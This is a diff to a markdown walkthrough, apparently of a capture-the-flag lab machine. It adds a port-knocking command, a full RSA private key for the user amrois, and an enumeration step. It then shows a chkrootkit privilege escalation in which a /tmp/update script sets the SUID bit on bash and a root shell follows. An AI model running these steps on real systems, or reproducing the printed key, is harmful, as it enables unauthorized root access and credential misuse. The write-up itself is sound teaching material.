@@ -285,11 +285,105 @@ This says I can open SSH by hitting 571, 290, and then 911 with syns, all within
 <mark style="color:yellow;">**Using knockd**</mark>
 
 ```shellscript
-knock -v 10.129.6.13 571 290 911 -d 500
+knock -v 10.129.6.46 571 290 911 -d 500
 ```
 
-<figure><img src="../../.gitbook/assets/image (3164).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-Afterward, use the private RSA key stored in the `amrois_rsa` file to establish an SSH connection.
+Afterward, I'll use the private RSA key discovered in the png file earlier to establish an SSH connection.
+
+{% code title="amrios_id_rsa" %}
+```shellscript
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+```
+{% endcode %}
 
 <figure><img src="../../.gitbook/assets/image (3192).png" alt=""><figcaption></figcaption></figure>
+
+### <mark style="color:blue;">Shell as amrois</mark>
+
+#### <mark style="color:$primary;">Manual Enumeration</mark>
+
+Checking for folders owned by our user
+
+```shellscript
+find / -type d -user amrois 2>/dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Found an interesting folder owned by amrois
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+It seems a scheduled task is running in the background and creating reports
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+The reports shows a scan for changes to common executables and for odd files. I'll upload and run pspy to check for running processes
+
+### <mark style="color:blue;">PSPy64</mark>
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+Every minute, there are many processes running most of them referencing `/usr/bin/chkrootkit`. [chkrootkit](http://www.chkrootkit.org/) is a tool that will check a host for for signs of a rootkit.
+
+### <mark style="color:blue;">chrootkit Privesc</mark>
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Searchsploit reveals a local privesc for chkrootkit&#x20;
+
+The exploit reveals that we need to create a file named `update` in the `/tmp` directory, which **chkrootkit** will execute as root.
+
+I'll create a simple bash file that will set the SUID bit on bash giving us an easy privesc afterwards
+
+```shellscript
+echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > update
+```
+
+```shellscript
+chmod +x update
+```
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+The next time `chkroot` runs it will set the SUID to bash
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+to escalate to root now will simply run&#x20;
+
+```shellscript
+/bin/bash -p
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
